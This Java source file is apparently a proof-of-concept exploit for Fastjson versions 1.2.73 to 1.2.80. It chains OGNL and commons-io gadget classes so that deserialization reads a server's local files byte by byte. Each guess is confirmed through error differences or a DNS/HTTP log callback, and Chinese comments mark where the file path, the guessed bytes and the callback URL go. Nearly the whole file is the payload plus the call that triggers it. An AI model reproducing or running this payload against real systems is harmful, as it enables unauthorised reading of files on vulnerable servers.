package com.shiro.vuln.fastjson;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;

import com.alibaba.fastjson.JSON;

public class Fastjson22_ognl_io_read_error_dnslog {
    public static void main(String[] args) throws Exception, IOException{
    	
    	String url = "file:///D:/";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
        System.out.println(Arrays.toString(bs));
        System.out.println(new String(bs));
    	
        //依赖1.2.73-1.2.80 ognl-3.2.21  commons-io-2.2 根据报错不一样或者是否有dnslog/httplog来布尔读文件
        String poc1 ="[{\r\n"
        		+ "		\"su15\": {\r\n"
        		+ "			\"@type\": \"java.lang.Exception\",\r\n"
        		+ "			\"@type\": \"ognl.OgnlException\",\r\n"
        		+ "		}\r\n"
        		+ "	}, {\r\n"
        		+ "		\"su16\": {\r\n"
        		+ "			\"@type\": \"java.lang.Class\",\r\n"
        		+ "			\"val\": {\r\n"
        		+ "				\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "				{\r\n"
        		+ "					\"@type\": \"java.lang.String\"\r\n"
        		+ "					\"@type\": \"ognl.OgnlException\",\r\n"
        		+ "					\"_evaluation\": \"\"\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		{\r\n"
        		+ "			\"su17\": {\r\n"
        		+ "				\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "				\"node\": {\r\n"
        		+ "					\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "					\"p\": {\r\n"
        		+ "						\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "						\"stream\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "							\"delegate\": {\r\n"
        		+ "								\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "								\"reader\": {\r\n"
        		+ "									\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
   /*文件路径*/	+ "									\"url\": \"file:///D:/\"\r\n"
        		+ "								},\r\n"
        		+ "								\"charsetName\": \"UTF-8\",\r\n"
        		+ "								\"bufferSize\": 1024\r\n"
        		+ "							},\r\n"
        		+ "							\"boms\": [{\r\n"
        		+ "								\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "								\"charsetName\": \"UTF-8\",\r\n"
        		+ "								\"bytes\": [\r\n"
   /*文件bytes*/	+ "									36, 82\r\n"
        		+ "								]\r\n"
        		+ "							}]\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		{\r\n"
        		+ "			\"su18\": {\r\n"
        		+ "				\"$ref\": \"$[2].su17.node.p.stream\"\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		{\r\n"
        		+ "			\"su19\": {\r\n"
        		+ "				\"$ref\": \"$[3].su18.bOM.bytes\"\r\n"
        		+ "			}\r\n"
        		+ "		},{\r\n"
        		+ "			\"su20\": {\r\n"
        		+ "				\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "				\"node\": {\r\n"
        		+ "					\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "					\"p\": {\r\n"
        		+ "						\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "						\"stream\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "							\"delegate\": {\r\n"
        		+ "								\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "								\"reader\": {\r\n"
        		+ "									\"@type\": \"org.apache.commons.io.input.CharSequenceReader\",\r\n"
        		+ "									\"charSequence\": {\r\n"
        		+ "										\"@type\": \"java.lang.String\" {\r\n"
        		+ "											\"$ref\": \"$[4].su19\"\r\n"
        		+ "										},\r\n"
        		+ "										\"start\": 0,\r\n"
        		+ "										\"end\": 0\r\n"
        		+ "									},\r\n"
        		+ "									\"charsetName\": \"UTF-8\",\r\n"
        		+ "									\"bufferSize\": 1024\r\n"
        		+ "								},\r\n"
        		+ "								\"boms\": [{\r\n"
        		+ "									\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "									\"charsetName\": \"UTF-8\",\r\n"
        		+ "									\"bytes\": [1]\r\n"
        		+ "								}]\r\n"
        		+ "							}\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			},{\r\n"
        		+ "			\"su21\": {\r\n"
        		+ "				\"@type\": \"ognl.Evaluation\",\r\n"
        		+ "				\"node\": {\r\n"
        		+ "					\"@type\": \"ognl.ASTMethod\",\r\n"
        		+ "					\"p\": {\r\n"
        		+ "						\"@type\": \"ognl.OgnlParser\",\r\n"
        		+ "						\"stream\": {\r\n"
        		+ "							\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "							\"delegate\": {\r\n"
        		+ "								\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
        		+ "								\"reader\": {\r\n"
        		+ "									\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
/*dnslog*/		+ "									\"url\": \"http://127.0.0.1:5667\"\r\n"
        		+ "								},\r\n"
        		+ "								\"charsetName\": \"UTF-8\",\r\n"
        		+ "								\"bufferSize\": 1024\r\n"
        		+ "							},\r\n"
        		+ "							\"boms\": [{\r\n"
        		+ "								\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "								\"charsetName\": \"UTF-8\",\r\n"
        		+ "								\"bytes\": [\r\n"
        		+ "									49\r\n"
        		+ "								]\r\n"
        		+ "							}]\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		{\r\n"
        		+ "			\"su22\": {\r\n"
        		+ "				\"$ref\": \"$[6].su21.node.p.stream\"\r\n"
        		+ "			}\r\n"
        		+ "		},\r\n"
        		+ "		{\r\n"
        		+ "			\"su23\": {\r\n"
        		+ "				\"$ref\": \"$[7].su22.bOM.bytes\"\r\n"
        		+ "			}\r\n"
        		+ "		}]";
   
   
   
        System.out.println(poc1);
        JSON.parseObject(poc1);
       
    }
}
